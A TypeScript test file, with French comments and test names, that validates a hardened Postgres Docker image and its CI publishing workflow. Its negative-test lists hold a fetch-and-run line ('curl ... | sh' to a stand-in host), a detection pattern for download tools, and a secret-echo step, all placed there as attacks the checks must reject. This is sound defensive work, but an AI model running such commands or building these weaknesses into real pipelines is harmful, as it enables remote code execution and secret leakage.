import { existsSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { load } from "js-yaml";
import { describe, expect, it } from "vitest";

// Images dérivées temporaires (ADR 0014). Les fichiers sont lus par de vrais analyseurs : Dockerfile instruction par instruction, YAML par js-yaml.

const lire = (chemin: string) => readFileSync(fileURLToPath(new URL(`../${chemin}`, import.meta.url)), "utf8");
const DOCKERFILE = "ops/images/postgres-derivee/Dockerfile";
const WORKFLOW = ".github/workflows/images-derivees.yml";
const AMONT = "postgres:16.15-alpine@sha256:f4610795587492cd4fb887c2dc3de301b813278bb6f616992061141b5f15ac36";
const TRIVY = "ghcr.io/aquasecurity/trivy@sha256:665030f4d33a82c1e8d9d5e0453365842236723c1ee5cc3becca698268e66a56";
const IMAGE = "ghcr.io/will383842/axion-automatisations-clients/postgres-derivee";

type Obj = Record<string, unknown>;
const estObj = (v: unknown): v is Obj => typeof v === "object" && v !== null && !Array.isArray(v);
const copie = <T>(v: T): T => JSON.parse(JSON.stringify(v)) as T;

interface Instruction {
  cmd: string;
  arg: string;
}
function instructions(texte: string): Instruction[] {
  const sortie: Instruction[] = [];
  let courante = "";
  for (const brute of texte.split("\n")) {
    const l = brute.trim();
    if (l.startsWith("#")) continue;
    if (l.endsWith("\\")) {
      courante += `${l.slice(0, -1)} `;
      continue;
    }
    const complete = `${courante}${l}`.trim();
    courante = "";
    if (!complete) continue;
    const [cmd = "", ...reste] = complete.split(/\s+/);
    sortie.push({ cmd: cmd.toUpperCase(), arg: reste.join(" ") });
  }
  return sortie;
}

function analyserDockerfile(texte: string): string[] {
  const erreurs: string[] = [];
  const liste = instructions(texte);
  const from = liste.filter((i) => i.cmd === "FROM");
  if (from.length !== 1) erreurs.push("un seul FROM exigé");
  if (from[0]?.arg !== AMONT) erreurs.push("FROM différent de l'amont épinglé par empreinte");
  const suppression = liste.filter((i) => i.cmd === "RUN" && /^rm\s/.test(i.arg));
  const jetons = suppression.flatMap((i) => i.arg.split(/\s+/).slice(1));
  if (jetons.some((j) => j.startsWith("-")) || !jetons.includes("/usr/local/bin/gosu") || !jetons.includes("/usr/local/bin/su-exec")) erreurs.push("rm sans option qui retire gosu et su-exec exigé");
  for (const i of liste) {
    if (!suppression.includes(i) && /gosu|su-exec/.test(i.arg)) erreurs.push(`${i.cmd} : gosu ou su-exec réapparaît`);
    if (["ADD", "COPY", "ENTRYPOINT", "CMD", "VOLUME", "ONBUILD"].includes(i.cmd)) erreurs.push(`${i.cmd} interdit`);
    if (/\b(curl|wget|apk|apt|apt-get|pip)\b|\|\s*(ba)?sh/.test(i.arg)) erreurs.push(`${i.cmd} : téléchargement ou installation interdits`);
    if ((i.cmd === "ARG" || i.cmd === "ENV") && /TOKEN|KEY|SECRET|PASSWORD/i.test(i.arg.split(/[=\s]/)[0] ?? "")) erreurs.push(`${i.cmd} : nom de secret`);
  }
  const dernier = liste[liste.length - 1];
  if (dernier?.cmd !== "USER" || dernier.arg !== "postgres") erreurs.push("la dernière instruction doit être USER postgres");
  return erreurs;
}

const etapes = (job: unknown): Obj[] => (estObj(job) && Array.isArray(job.steps) ? job.steps.filter(estObj) : []);
const execute = (e: Obj) => (typeof e.run === "string" ? e.run : "");
const trouver = (job: unknown, motif: string) => etapes(job).findIndex((e) => execute(e).includes(motif));

function analyserWorkflow(doc: Obj): string[] {
  const erreurs: string[] = [];
  const texte = JSON.stringify(doc);
  const jobs = estObj(doc.jobs) ? doc.jobs : {};
  const on = doc.on ?? doc["true"];
  if (JSON.stringify(doc.permissions) !== JSON.stringify({ contents: "read" })) erreurs.push("permissions de tête : contents: read seulement");
  if (texte.includes("pull_request_target")) erreurs.push("pull_request_target interdit");
  if (!estObj(on) || !("pull_request" in on)) erreurs.push("construction attendue sur pull_request");
  if (/secrets\./.test(texte)) erreurs.push("secrets.* interdit");
  const nomsJobs = Object.keys(jobs).sort().join(",");
  if (nomsJobs !== "construire,publier") erreurs.push(`jobs attendus : construire et publier (trouvé : ${nomsJobs})`);
  for (const [nom, job] of Object.entries(jobs)) {
    if (!estObj(job)) continue;
    const permissions = estObj(job.permissions) ? job.permissions : {};
    if (nom === "publier") {
      if (JSON.stringify(Object.entries(permissions).sort()) !== JSON.stringify([["attestations", "write"], ["contents", "read"], ["id-token", "write"], ["packages", "write"]])) erreurs.push("publier : permissions exactes attendues");
      const cond = String(job.if ?? "");
      if (!cond.includes("github.event_name != 'pull_request'") || !cond.includes("github.ref == 'refs/heads/main'")) erreurs.push("publier : ne doit tourner ni sur pull_request ni hors main");
      if (job.needs !== "construire") erreurs.push("publier : needs construire");
    } else if (Object.entries(permissions).some(([, v]) => v !== "read") || ["packages", "id-token", "attestations"].some((k) => k in permissions)) erreurs.push(`${nom} : aucune écriture`);
    for (const e of etapes(job)) {
      if (typeof e.uses === "string") {
        if (!/^[\w.-]+\/[\w./-]+@[0-9a-f]{40}$/.test(e.uses)) erreurs.push(`action non épinglée par SHA : ${e.uses}`);
        if (!/^actions\/(checkout|setup-node|attest-build-provenance)@/.test(e.uses)) erreurs.push(`action hors liste : ${e.uses}`);
        if (e.uses.startsWith("actions/checkout@") && !(estObj(e.with) && e.with["persist-credentials"] === false)) erreurs.push("checkout sans persist-credentials: false");
        if (e.uses.startsWith("actions/attest-build-provenance@") && nom !== "publier") erreurs.push("attestation hors publier");
      }
      const cmd = execute(e);
      if (nom !== "publier" && /docker\s+(push|login)|buildx|--push/.test(cmd)) erreurs.push(`${nom} : publication ou connexion interdites`);
      if (cmd.includes("aquasecurity/trivy") && !cmd.includes(TRIVY)) erreurs.push("Trivy : empreinte différente de garde-briques.yml");
      if (/docker\s+(build|run)/.test(cmd) && /--platform\s+(?!linux\/amd64)/.test(cmd)) erreurs.push("plateforme inattendue");
    }
  }
  const pub = jobs.publier;
  const [fumee, trivy, garde, pousser] = ["pg_isready", "aquasecurity/trivy", "releve-trivy.ts --garde", "docker push"].map((m) => trouver(pub, m));
  const attester = etapes(pub).findIndex((e) => typeof e.uses === "string" && e.uses.startsWith("actions/attest-build-provenance@"));
  if ([fumee, trivy, garde, pousser, attester].some((n) => n < 0)) erreurs.push("publier : test de fumée, Trivy, évaluateur, push et attestation exigés");
  else if (!(fumee < trivy && trivy < garde && garde < pousser && pousser < attester)) erreurs.push("publier : push seulement après fumée, Trivy et évaluateur, attestation après le push");
  const etapePush = etapes(pub)[pousser];
  const attestation = etapes(pub)[attester];
  const id = etapePush?.id;
  if (typeof id !== "string" || !execute(etapePush ?? {}).includes("empreinte=") || !execute(etapePush ?? {}).includes("RepoDigests")) erreurs.push("push : l'empreinte doit être lue après le push");
  else if (!estObj(attestation?.with) || attestation.with["subject-digest"] !== `\${{ steps.${id}.outputs.empreinte }}` || attestation.with["subject-name"] !== IMAGE || attestation.with["push-to-registry"] !== true) erreurs.push("attestation : doit porter l'empreinte poussée");
  const construire = jobs.construire;
  if (trouver(construire, "releve-trivy.ts --garde") < 0 || trouver(construire, "aquasecurity/trivy") < 0 || trouver(construire, "pg_isready") < 0) erreurs.push("construire : fumée, Trivy et évaluateur exigés");
  return erreurs;
}

const reel = () => load(lire(WORKFLOW)) as Obj;

describe("images dérivées : Dockerfile postgres", () => {
  it("[A-381] image dérivée postgres : un seul FROM, égal à l'amont épinglé par empreinte", () => {
    const from = instructions(lire(DOCKERFILE)).filter((i) => i.cmd === "FROM");
    expect(from.map((i) => i.arg)).toEqual([AMONT]);
  });
  it("[A-381] image dérivée postgres : retire gosu et su-exec et finit en USER postgres", () => {
    expect(analyserDockerfile(lire(DOCKERFILE))).toEqual([]);
    expect(instructions(lire(DOCKERFILE)).at(-1)).toEqual({ cmd: "USER", arg: "postgres" });
  });
  it("[A-381] image dérivée postgres : l'image du socle (pg_partman) reste à sa place", () => {
    expect(lire("ops/images/postgres/Dockerfile")).toContain("postgresql-16-partman");
  });
  describe("attaques refusées", () => {
    const ok = lire(DOCKERFILE);
    const attaques: [string, string][] = [
      ["FROM sur une étiquette seule", ok.replace(/^FROM .*$/m, "FROM postgres:16.15-alpine")],
      ["FROM sur latest", ok.replace(/^FROM .*$/m, "FROM postgres:latest")],
      ["FROM d'une autre empreinte", ok.replace(/@sha256:[0-9a-f]{64}/, `@sha256:${"0".repeat(64)}`)],
      ["deuxième FROM", `${ok}\nFROM alpine:3.20`],
      ["gosu qui réapparaît par apk", `${ok.replace("USER postgres", "")}\nRUN apk add --no-cache gosu\nUSER postgres`],
      ["gosu recopié sans commande de téléchargement", `${ok.replace("USER postgres", "")}\nRUN cp /bin/gosu-copie /usr/local/bin/gosu\nUSER postgres`],
      ["rm -f qui tait un échec", ok.replace("RUN rm ", "RUN rm -f ")],
      ["su-exec oublié", ok.replace(" /usr/local/bin/su-exec", "")],
      ["démarrage en root", ok.replace(/USER postgres\s*$/, "USER root\n")],
      ["instruction après USER", `${ok.trimEnd()}\nRUN true\n`],
      ["téléchargement par curl", `${ok.replace("USER postgres", "")}\nRUN curl -s https://exemple.test/x | sh\nUSER postgres`],
      ["ENTRYPOINT remplacé", `${ok.replace("USER postgres", "")}\nENTRYPOINT ["sh"]\nUSER postgres`],
      ["ARG nommé comme un secret", `${ok.replace("USER postgres", "")}\nARG TOKEN_DEPOT\nUSER postgres`],
    ];
    it.each(attaques)("[A-381] Dockerfile refusé : %s", (_nom, texte) => {
      expect(analyserDockerfile(texte)).not.toEqual([]);
    });
  });
});

describe("images dérivées : workflow", () => {
  it("[A-381] images-derivees.yml : permissions de tête contents: read ; packages: write, id-token: write et attestations: write seulement dans le job publier, qui ne tourne pas sur pull_request", () => {
    const doc = reel();
    expect(doc.permissions).toEqual({ contents: "read" });
    const jobs = doc.jobs as Obj;
    expect(Object.keys(jobs).sort()).toEqual(["construire", "publier"]);
    expect((jobs.construire as Obj).permissions).toEqual({ contents: "read" });
    expect((jobs.publier as Obj).permissions).toEqual({ contents: "read", packages: "write", "id-token": "write", attestations: "write" });
    expect(String((jobs.publier as Obj).if)).toContain("github.event_name != 'pull_request'");
    expect(String((jobs.publier as Obj).if)).toContain("github.ref == 'refs/heads/main'");
    expect(analyserWorkflow(doc)).toEqual([]);
  });
  it("[A-381] images-derivees.yml : toutes les actions sont épinglées par SHA de 40 signes, aucune action docker tierce, aucun secrets.*", () => {
    const doc = reel();
    const actions = Object.values(doc.jobs as Obj).flatMap(etapes).flatMap((e) => (typeof e.uses === "string" ? [e.uses] : []));
    expect(actions.length).toBeGreaterThan(0);
    for (const a of actions) expect(a).toMatch(/^actions\/(checkout|setup-node|attest-build-provenance)@[0-9a-f]{40}$/);
    expect(actions.some((a) => a.startsWith("docker/"))).toBe(false);
    expect(JSON.stringify(doc)).not.toMatch(/secrets\./);
  });
  it("[A-381] images-derivees.yml : le même évaluateur (releve-trivy --garde, seuils 7 et 30 jours) et la même empreinte Trivy que garde-briques.yml", () => {
    const doc = reel();
    const commandes = Object.values(doc.jobs as Obj).flatMap(etapes).map(execute).join("\n");
    expect(commandes).toContain(TRIVY);
    expect(commandes).toContain("node scripts/releve-trivy.ts --garde");
    if (existsSync(fileURLToPath(new URL("../.github/workflows/garde-briques.yml", import.meta.url)))) expect(lire(".github/workflows/garde-briques.yml")).toContain(TRIVY);
    expect(existsSync(fileURLToPath(new URL("../.trivyignore", import.meta.url)))).toBe(false);
    expect(commandes).not.toMatch(/ignore|skip-dirs|--severity|--ignore-unfixed/);
  });
  it("[A-381] images-derivees.yml : docker push n'arrive qu'après le test de fumée et Trivy, puis l'attestation porte l'empreinte poussée", () => {
    const publier = (reel().jobs as Obj).publier;
    const [fumee, trivy, garde, pousser] = ["pg_isready", "aquasecurity/trivy", "releve-trivy.ts --garde", "docker push"].map((m) => trouver(publier, m));
    expect(fumee).toBeGreaterThanOrEqual(0);
    expect(fumee).toBeLessThan(trivy ?? -1);
    expect(trivy).toBeLessThan(garde ?? -1);
    expect(garde).toBeLessThan(pousser ?? -1);
    const attester = etapes(publier).findIndex((e) => typeof e.uses === "string" && e.uses.startsWith("actions/attest-build-provenance@"));
    expect(attester).toBeGreaterThan(pousser ?? 99);
    const push = etapes(publier)[pousser ?? 0] ?? {};
    expect((etapes(publier)[attester]?.with as Obj)["subject-digest"]).toBe(`\${{ steps.${String(push.id)}.outputs.empreinte }}`);
  });
  it("[A-381] images-derivees.yml : un seul docker push dans tout le fichier", () => {
    expect(lire(WORKFLOW).match(/docker push/g)?.length).toBe(1);
  });
  describe("attaques refusées", () => {
    const modif = (f: (d: Obj) => void) => {
      const d = copie(reel());
      f(d);
      return analyserWorkflow(d);
    };
    const job = (d: Obj, n: string) => (d.jobs as Obj)[n] as Obj;
    const pas = (d: Obj, n: string) => job(d, n).steps as Obj[];
    const attaques: [string, (d: Obj) => void][] = [
      ["publier sur pull_request", (d) => delete job(d, "publier").if],
      ["publier sur toute branche", (d) => (job(d, "publier").if = "github.event_name != 'pull_request'")],
      ["écriture de paquets dans construire", (d) => (job(d, "construire").permissions = { contents: "read", packages: "write" })],
      ["permissions de tête en écriture", (d) => (d.permissions = { contents: "write" })],
      ["jeton d'identité absent de publier", (d) => delete (job(d, "publier").permissions as Obj)["id-token"]],
      ["pull_request_target", (d) => (d.on = { pull_request_target: null })],
      ["action non épinglée", (d) => (etapes(job(d, "construire"))[0]!.uses = "actions/checkout@v4")],
      ["action épinglée par SHA court", (d) => (etapes(job(d, "construire"))[0]!.uses = "actions/checkout@3d3c42e")],
      ["action docker tierce", (d) => pas(d, "construire").push({ uses: `docker/build-push-action@${"a".repeat(40)}` })],
      ["secret", (d) => (etapes(job(d, "publier"))[0]!.run = "echo ${{ secrets.JETON }}")],
      ["checkout qui garde les identifiants", (d) => ((etapes(job(d, "construire"))[0]!.with as Obj)["persist-credentials"] = true)],
      ["push dans construire", (d) => pas(d, "construire").push({ run: "docker push local/x" })],
      ["Trivy d'une autre empreinte", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "aquasecurity/trivy")]!.run = "docker run trivy:latest image x")],
      ["attestation sur une autre empreinte", (d) => ((etapes(job(d, "publier")).at(-1)!.with as Obj)["subject-digest"] = "sha256:inventee")],
      ["attestation avant le push", (d) => { const s = pas(d, "publier"); const a = s.pop()!; s.splice(trouver(job(d, "publier"), "docker push"), 0, a); }],
      ["push avant Trivy", (d) => { const s = pas(d, "publier"); const t = s.splice(trouver(job(d, "publier"), "aquasecurity/trivy"), 1)[0]!; s.push(t); }],
    ];
    it.each(attaques)("[A-381] workflow refusé : %s", (_nom, f) => {
      expect(modif(f)).not.toEqual([]);
    });
  });
});

describe("images dérivées : documents", () => {
  it("[A-381] README des images, ADR 0014 et Dependabot docker existent", () => {
    expect(lire("ops/images/README.md")).toContain("postgres-derivee");
    expect(lire("docs/adr/0014-images-derivees.md")).toContain("Trivy");
    expect(lire("docs/adr/README.md")).toContain("| 0014 |");
    const dependabot = load(lire(".github/dependabot.yml")) as { updates: { "package-ecosystem": string; directory: string }[] };
    expect(dependabot.updates.filter((u) => u["package-ecosystem"] === "docker").map((u) => u.directory)).toEqual(["/ops/images/postgres-derivee"]);
  });
});
